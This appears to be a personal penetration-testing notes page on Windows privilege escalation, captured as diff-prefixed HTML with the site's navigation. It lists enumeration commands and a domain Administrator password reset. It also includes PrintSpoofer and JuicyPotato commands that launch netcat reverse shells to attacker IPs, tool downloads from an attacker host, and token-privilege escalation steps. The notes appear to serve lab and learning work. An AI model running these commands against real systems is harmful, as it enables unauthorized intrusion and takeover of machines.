+
+  <li>
+      <a href="/notes/shell-and-payload/upgrade/">Upgrade</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Webs</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/web/access-control/">Access Control</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/api-testing/">API Testing</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/authentication/">Authentication</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/command-injection/">Command Injection</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/deserialization/">Deserialization</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/file-upload/">File Upload</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/git/">Git</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/graphsql/">Graphsql</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/jwt/">JWT</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/path-traversal/">Path Traversal</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/race-conditon/">Race Conditon</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/ssrf/">SSRF</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/web-cache/">Web Cache</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/wordpress/">Wordpress</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/xss/">XSS</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/xxe/">XXE</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Services</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/services/ftp/">FTP</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/iis/">IIS</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/ldap/">Ldap</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/mssql-mysql/">Mssql-Mysql</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/rpcbind/">RPCbind</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/rsync/">Rsync</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/rtsp/">RTSP</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/smtp/">SMTP</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/snmp/">SNMP</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Labs</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+    <details>
+      <summary>HTB</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/lab/htb/analysis/">Analysis</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/caption/">Caption</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/certified/">Certified</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/cicada/">Cicada</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/hospital/">Hospital</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/infiltrator/">Infiltrator</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/perfection/">Perfection</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/pov/">POV</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Vulnlab</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/lab/vulnlab/baby/">Baby</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/baby2/">Baby2</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/breach/">Breach</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/bruno/">Bruno</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/build/">Build</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/data/">Data</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/delegate/">Delegate</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/escape/">Escape</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/feedback/">Feedback</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/forgotten/">Forgotten</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/heron/">Heron</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/hybrid/">Hybrid</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/lock/">Lock</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/media/">Media</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/reflection/">Reflection</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/retro/">Retro</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/sendai/">Sendai</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/sync/">Sync</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/tea/">Tea</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/tengu/">Tengu</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/trusted/">Trusted</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Pwn-Reverse</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/pwn-reverse/android-emulation/">Android Emulation</a>
+  </li>
+
+  <li>
+    <details>
+      <summary>CTf</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/introduction-to-the-geomyides/">Introduction to the Geomyides</a>
+  </li>
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/keygen-me/">Keygen-Me</a>
+  </li>
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/simple-encryptor/">Simple Encryptor</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Dev</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/code/bash/">Bash</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/c/">C</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/c-/">C&#43;&#43;</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/go/">Go</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/java/">Java</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/lua/">Lua</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/nodejs/">Nodejs</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/php/">Php</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/ruby/">Ruby</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Ressources</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ressources/arch-setup/">Arch-Setup</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/command-linux/">Command Linux</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/debian-setup/">Debian-Setup</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/kvm/">Kvm</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/link/">Link</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/tmux/">Tmux</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Crypto</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/crypto/maths/">Maths</a>
+  </li>
+
+  <li>
+      <a href="/notes/crypto/scripting/">Scripting</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+  </ul>
+</nav>
+
+  
+
+		</div>
+		
+		<nav class="docs-toc d-none d-xl-block col-xl-3" aria-label="Secondary navigation">
+			<div class="page-links">
+  <h3>On this page</h3>
+    <nav id="toc">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#information-gathering">Information Gathering</a></li>
+        <li><a href="#windows-user-privileges">Windows User Privileges</a></li>
+        <li><a href="#windows-group-privileges">Windows Group Privileges</a></li>
+        <li><a href="#os-exploitation">OS Exploitation</a></li>
+        <li><a href="#additional-techniques">Additional Techniques</a></li>
+        <li><a href="#ressources">Ressources</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+</div>
+
+		</nav>
+		<main class="docs-content col-lg-11 col-xl-9">
+		
+			<h1>windows-privesc</h1>
+			
+			<nav class="toc-mobile d-xl-none" aria-label="Quaternary navigation">
+				<details>
+    <summary>On this page</summary>
+    <div class="page-links">
+      <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#information-gathering">Information Gathering</a></li>
+        <li><a href="#windows-user-privileges">Windows User Privileges</a></li>
+        <li><a href="#windows-group-privileges">Windows Group Privileges</a></li>
+        <li><a href="#os-exploitation">OS Exploitation</a></li>
+        <li><a href="#additional-techniques">Additional Techniques</a></li>
+        <li><a href="#ressources">Ressources</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+  </details>
+
+			</nav>
+			<h3 id="information-gathering">Information Gathering<a href="#information-gathering" class="anchor" aria-hidden="true">#</a> </h3>
+<p>#Windows_Enumeration</p>
+<p><strong>Network Information:</strong></p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">arp</span> <span class="o">-</span><span class="n">a</span>
+</span></span><span class="line"><span class="cl"><span class="n">route</span> <span class="nb">print</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>List hidden file :</strong></p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">cmd /c dir /A</span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>Change password of user</strong></p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">net user Administrator Password1234
+</span></span><span class="line"><span class="cl"><span class="c1">#for the whole doamin :</span>
+</span></span><span class="line"><span class="cl">net user Administrator Password1234 /domain</span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>List Symbolic link :</strong></p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">dir /AL /S c:<span class="err">\</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>Enumerating Protections:</strong></p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">Get</span><span class="o">-</span><span class="n">MpComputerStatus</span>
+</span></span><span class="line"><span class="cl"><span class="n">Get</span><span class="o">-</span><span class="n">AppLockerPolicy</span> <span class="o">-</span><span class="n">Effective</span> <span class="o">|</span> <span class="n">select</span> <span class="o">-</span><span class="n">ExpandProperty</span> <span class="n">RuleCollections</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>Testing App-Locker Security:</strong></p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">Get</span><span class="o">-</span><span class="n">AppLockerPolicy</span> <span class="o">-</span><span class="n">Local</span> <span class="o">|</span> <span class="n">Test</span><span class="o">-</span><span class="n">AppLockerPolicy</span> <span class="o">-</span><span class="n">path</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">System32</span>\<span class="n">cmd</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">User</span> <span class="n">Everyone</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>Useful Information:</strong></p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">tasklist</span> <span class="o">/</span><span class="n">svc</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span>
+</span></span><span class="line"><span class="cl"><span class="n">systeminfo</span>
+</span></span><span class="line"><span class="cl"><span class="n">wmic</span> <span class="n">qfe</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#or </span>
+</span></span><span class="line"><span class="cl"><span class="n">Get</span><span class="o">-</span><span class="n">HotFix</span> <span class="o">|</span> <span class="n">ft</span> <span class="o">-</span><span class="n">AutoSize</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>Installed Programs:</strong></p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">wmic</span> <span class="n">product</span> <span class="n">get</span> <span class="n">name</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#or </span>
+</span></span><span class="line"><span class="cl"><span class="n">Get</span><span class="o">-</span><span class="n">WmiObject</span> <span class="o">-</span><span class="n">Class</span> <span class="n">Win32_Product</span> <span class="o">|</span>  <span class="n">select</span> <span class="n">Name</span><span class="p">,</span> <span class="n">Version</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#or </span>
+</span></span><span class="line"><span class="cl"><span class="n">Get</span><span class="o">-</span><span class="n">ItemProperty</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*&#34;</span> <span class="o">|</span> <span class="n">select</span>
+</span></span><span class="line"><span class="cl"><span class="n">displayname</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span>
+</span></span><span class="line"><span class="cl"><span class="n">Get</span><span class="o">-</span><span class="n">ItemProperty</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*&#34;</span> <span class="o">|</span> <span class="n">select</span> <span class="n">displayname</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>Permission on a file :</strong></p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">Get-ACl file.txt</span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>Display Running Processes:</strong></p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">netstat</span> <span class="o">-</span><span class="n">ano</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>Logged-In Users:</strong></p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">query</span> <span class="n">user</span>
+</span></span><span class="line"><span class="cl"><span class="n">query</span> <span class="n">session</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>Current User and Privileges:</strong></p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">echo</span> <span class="o">%</span><span class="n">USERNAME</span><span class="o">%</span>
+</span></span><span class="line"><span class="cl"><span class="n">whoami</span> <span class="o">/</span><span class="n">priv</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>See Encrypted file on the system :</strong></p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">CIPHER /u /n</span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>Get All Groups:</strong></p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">net</span> <span class="n">localgroup</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>Password Policy &amp; Other Account Information:</strong></p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">net</span> <span class="n">accounts</span>
+</span></span><span class="line"><span class="cl"><span class="n">net</span> <span class="n">user</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>Listing Named Pipes:</strong></p>
+<ul>
+<li>Download pipelist.exe from <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/pipelist">https://learn.microsoft.com/en-us/sysinternals/downloads/pipelist</a></li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">pipelist</span><span class="o">.</span><span class="n">exe</span> <span class="o">/</span><span class="n">accepteula</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#or </span>
+</span></span><span class="line"><span class="cl"><span class="n">gci</span> \\<span class="o">.</span>\<span class="n">pipe</span>\
+</span></span><span class="line"><span class="cl"><span class="c1">#or</span>
+</span></span><span class="line"><span class="cl"><span class="n">Get</span><span class="o">-</span><span class="n">ChildItem</span> <span class="s2">&#34;</span><span class="se">\\</span><span class="s2">.\pipe</span><span class="se">\&#34;</span><span class="s2"> | Where-Object { -not $_.PsIsContainer } | ForEach-Object { Write-Output &#34;</span><span class="n">Named</span> <span class="n">Pipe</span><span class="p">:</span> <span class="err">$</span><span class="p">(</span><span class="err">$</span><span class="n">_</span><span class="o">.</span><span class="n">FullName</span><span class="p">)</span><span class="s2">&#34; }</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>Enumerating Permissions:</strong></p>
+<ul>
+<li>Download accesschk from <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk">https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk</a></li>
+<li>Download accesschk:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">Invoke</span><span class="o">-</span><span class="n">WebRequest</span> <span class="o">-</span><span class="n">Uri</span> <span class="s2">&#34;http://10.10.16.100:8080/accesschk64.exe&#34;</span> <span class="o">-</span><span class="n">OutFile</span> <span class="s2">&#34;C:\Users\htb-student\Desktop</span><span class="se">\a</span><span class="s2">ccesschk64.exe&#34;</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Execute accesschk:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">accesschk</span> <span class="o">/</span><span class="n">accepteula</span> \\<span class="o">.</span>\<span class="n">Pipe</span>\<span class="n">lsass</span> <span class="o">-</span><span class="n">v</span> <span class="c1">#for lsass</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#with powershell </span>
+</span></span><span class="line"><span class="cl"><span class="o">.</span>\<span class="n">accesschk64</span><span class="o">.</span><span class="n">exe</span> \<span class="n">pipe</span>\<span class="n">SQLLocal</span>\<span class="n">SQLEXPRESS01</span> <span class="o">-</span><span class="n">v</span> </span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Get Installed Programs via PowerShell &amp; Registry Keys</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">htb</span><span class="p">&gt;</span> <span class="nv">$INSTALLED</span> <span class="p">=</span> <span class="nb">Get-ItemProperty</span> <span class="n">HKLM</span><span class="err">:</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">CurrentVersion</span><span class="p">\</span><span class="n">Uninstall</span><span class="p">\*</span> <span class="p">|</span>  <span class="nb">Select-Object</span> <span class="n">DisplayName</span><span class="p">,</span> <span class="n">DisplayVersion</span><span class="p">,</span> <span class="n">InstallLocation</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">htb</span><span class="p">&gt;</span> <span class="nv">$INSTALLED</span> <span class="p">+=</span> <span class="nb">Get-ItemProperty</span> <span class="n">HKLM</span><span class="err">:</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">Wow6432Node</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">CurrentVersion</span><span class="p">\</span><span class="n">Uninstall</span><span class="p">\*</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">DisplayName</span><span class="p">,</span> <span class="n">DisplayVersion</span><span class="p">,</span> <span class="n">InstallLocation</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">htb</span><span class="p">&gt;</span> <span class="nv">$INSTALLED</span> <span class="p">|</span> <span class="p">?{</span> <span class="nv">$_</span><span class="p">.</span><span class="py">DisplayName</span> <span class="o">-ne</span> <span class="vm">$null</span> <span class="p">}</span> <span class="p">|</span> <span class="nb">sort-object</span> <span class="n">-Property</span> <span class="n">DisplayName</span> <span class="n">-Unique</span> <span class="p">|</span> <span class="nb">Format-Table</span> <span class="n">-AutoSize</span></span></span></code></pre></div>
+  </figure>
+</div>
+<h3 id="windows-user-privileges">Windows User Privileges<a href="#windows-user-privileges" class="anchor" aria-hidden="true">#</a> </h3>
+<h4 id="nt-authority--local-service">NT AUTHORITY / LOCAL SERVICE<a href="#nt-authority--local-service" class="anchor" aria-hidden="true">#</a> </h4>
+<p>https://github.com/itm4n/FullPowers</p>
+<ul>
+<li>Enable privilege like impersonate :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">FullPower.exe</span></span></code></pre></div>
+  </figure>
+</div>
+<h4 id="seimpersonate-and-seassignprimarytoken">SeImpersonate and SeAssignPrimaryToken:<a href="#seimpersonate-and-seassignprimarytoken" class="anchor" aria-hidden="true">#</a> </h4>
+<p>#SeImpersonate  #SeAssignPrimaryToken</p>
+<p><strong>NetCat:</strong></p>
+<ul>
+<li>Download Netcat:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">wget</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">int0x33</span><span class="o">/</span><span class="n">nc</span><span class="o">.</span><span class="n">exe</span><span class="o">/</span><span class="n">blob</span><span class="o">/</span><span class="n">master</span><span class="o">/</span><span class="n">nc</span><span class="o">.</span><span class="n">exe</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>PrintSpoofer:</strong></p>
+<ul>
+<li>Download PrintSpoofer:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">wget https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Run command:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">C<span class="p">:</span><span class="nl">\Tools\PrintSpoofer.exe</span><span class="c1"> -c &#34;c:\tools\nc.exe 10.10.16.100 8443 -e cmd&#34;</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>Juicy Potatoes:</strong></p>
+<ul>
+<li>Download JuicyPotato:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">wget</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">ohpe</span><span class="o">/</span><span class="n">juicy</span><span class="o">-</span><span class="n">potato</span><span class="o">/</span><span class="n">releases</span><span class="o">/</span><span class="n">download</span><span class="o">/</span><span class="n">v0</span><span class="mf">.1</span><span class="o">/</span><span class="n">JuicyPotato</span><span class="o">.</span><span class="n">exe</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Run command:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">c:<span class="se">\t</span>ools<span class="se">\J</span>uicyPotato.exe -l <span class="m">53375</span> -p c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\c</span>md.exe -a <span class="s2">&#34;/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe&#34;</span> -t *</span></span></code></pre></div>
+  </figure>
+</div>
+<p>https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer</p>
+<h4 id="sedebugprivilege">SeDebugPrivilege<a href="#sedebugprivilege" class="anchor" aria-hidden="true">#</a> </h4>
+<p>#SeDebugPrivilege #Enable_Privilege</p>
+<p>**Enable privileges **</p>
+<ul>
+<li>Download script :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">wget https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Enable all privileges :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"> <span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">EnableAllTokenPrivs</span><span class="p">.</span><span class="py">ps1</span>
+</span></span><span class="line"><span class="cl"><span class="p">.\</span><span class="n">EnableAllTokenPrivs</span><span class="p">.</span><span class="py">ps1</span>
+</span></span><span class="line"><span class="cl"><span class="n">whoami</span> <span class="p">/</span><span class="n">priv</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Resources :
+https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/
+https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77</li>
+</ul>
+<p><strong>Migrate Process</strong></p>
+<ul>
+<li>Get LSASS process id:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">ps </span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
